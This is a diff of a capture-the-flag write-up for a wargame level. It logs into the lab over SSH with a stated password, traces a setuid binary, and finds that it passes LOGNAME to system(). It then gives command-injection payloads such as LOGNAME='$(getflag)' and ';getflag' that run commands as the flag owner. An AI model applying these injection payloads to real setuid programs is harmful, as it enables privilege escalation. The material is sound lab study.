@@ -7,9 +7,10 @@ Login
 ```b
 > ssh level07@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
 > Password: wiok45aaoguiboiki2tuin6ub
+```
+```b
 > ls -l
 -rwsr-sr-x 1 flag07 level07 8805 level07
-   ^ i can exec this bin as use 'flag07' ie. my privileges elevated as if i were flag07
 ```
 
 Command list
@@ -23,7 +24,7 @@ Command list
                         regex ^^
 > objdump -d level07 | grep -E "getenv|system|exec|echo|puts|write|printf"
 > ltrace ./level07  🟢
-> readelf -p .rodata ./level07  🟢 this one does the job
+> readelf -p .rodata ./level07  🟢
 ```
 
 Using `readelf -p .rodata` and `ltrace`
@@ -34,7 +35,7 @@ Using `readelf -p .rodata` and `ltrace`
 
 String dump of section '.rodata':
   [     8]  LOGNAME
-            ^^^^^^^  🟢
+            ^^^^^^^ 
   [    10]  /bin/echo %s 
 ```
 ```b
@@ -46,7 +47,7 @@ geteuid()                                                  = 2007
 setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)        = 0
 setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)        = 0
 getenv("LOGNAME")                                          = "level07"
-        ^^^^^^^  🟢 
+        ^^^^^^^  
 asprintf(0xbffff744, 0x8048688, 0xbfffff4b, 0xb7e5ee55, 0xb7fed280) = 18
 system("/bin/echo level07 "level07
  <unfinished ...>
@@ -55,24 +56,12 @@ system("/bin/echo level07 "level07
 +++ exited (status 0) +++
 ```
 
-Run it and we found that it prints `LOGNAME`
-
-```b
-> env logname
-> ./level07 whoami
-level07
-> ./level07 env
-level07
-> export LOGNAME='`id`'
-> ./level07 
-uid=3007(flag07) gid=2007(level07) groups=3007(flag07),100(users),2007(level07)
-```
-
 Solution
 ```b
-> export LOGNAME='$(getflag)'
-> export LOGNAME=";getflag"
-> export LOGNAME='`getflag`'
-   THEN
-> ./level07
+   Either one of 
+export LOGNAME='$(getflag)'
+export LOGNAME=";getflag"
+export LOGNAME='`getflag`'
+   Then
+./level07
 ```
